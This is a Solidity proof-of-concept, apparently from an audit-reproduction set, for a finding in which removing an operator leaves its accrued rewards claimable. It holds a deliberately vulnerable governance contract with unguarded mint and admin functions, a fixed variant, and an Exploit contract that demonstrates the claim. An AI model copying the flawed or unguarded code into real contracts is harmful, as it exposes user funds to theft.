// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Smoothly — deleteOperators clears the operator flag and leaves
    operatorRewards in place (Pashov, C-02). A removed operator still claims
    the accrued rewards. Wiping the balance and sending it to the pool on
    removal makes the same claim pay 0. */

contract Cash26461 {
    string public name = "Reward";
    string public symbol = "RWD";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PoolGovernance26461 {
    Cash26461 public rewards;
    mapping(address => bool) public isOperator;
    mapping(address => uint256) public operatorRewards;

    constructor(Cash26461 r) {
        rewards = r;
    }

    function addOperator(address op, uint256 reward) external {
        isOperator[op] = true;
        operatorRewards[op] = reward;
    }

    function deleteOperators(address op) external {
        // @> VULN: the operator is removed from governance but operatorRewards[op] is left intact, so the removed operator can still claim.
        isOperator[op] = false;
    }

    function deleteOperatorsAndSeize(address op, address pool) external returns (uint256 seized) {
        isOperator[op] = false;
        seized = operatorRewards[op];
        operatorRewards[op] = 0;
        if (seized > 0) {
            rewards.transfer(pool, seized);
        }
    }

    function claim(address op) external returns (uint256 paid) {
        paid = operatorRewards[op];
        operatorRewards[op] = 0;
        if (paid > 0) {
            rewards.transfer(op, paid);
        }
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;
    address public constant POOL = 0x9999999999999999999999999999999999999999;

    Cash26461 public rewards;
    PoolGovernance26461 public gov;
    Cash26461 public rewardsC;
    PoolGovernance26461 public govC;

    uint256 public accrued;
    bool public stillOperator;
    uint256 public rewardsLeftOnBooks;
    uint256 public claimed;
    uint256 public controlSeized;
    uint256 public controlClaimed;
    uint256 public poolGot;

    function run() external {
        rewards = new Cash26461();
        gov = new PoolGovernance26461(rewards);
        rewardsC = new Cash26461();
        govC = new PoolGovernance26461(rewardsC);

        rewards.mint(address(gov), N);
        gov.addOperator(address(this), N);
        accrued = gov.operatorRewards(address(this));

        gov.deleteOperators(address(this));
        stillOperator = gov.isOperator(address(this));
        rewardsLeftOnBooks = gov.operatorRewards(address(this));
        claimed = gov.claim(address(this));

        rewardsC.mint(address(govC), N);
        govC.addOperator(address(this), N);
        controlSeized = govC.deleteOperatorsAndSeize(address(this), POOL);
        controlClaimed = govC.claim(address(this));
        poolGot = rewardsC.balanceOf(POOL);

        require(accrued == N, "accrued");
        require(stillOperator == false, "removed");
        require(rewardsLeftOnBooks == N, "left");
        require(claimed == N, "claimed");
        require(rewards.balanceOf(address(this)) == N, "attacker");
        require(rewards.balanceOf(address(gov)) == 0, "gov empty");
        require(controlSeized == N, "seized");
        require(controlClaimed == 0, "control claim");
        require(poolGot == N, "pool");
        require(rewardsC.balanceOf(address(this)) == 0, "control attacker");
    }
}
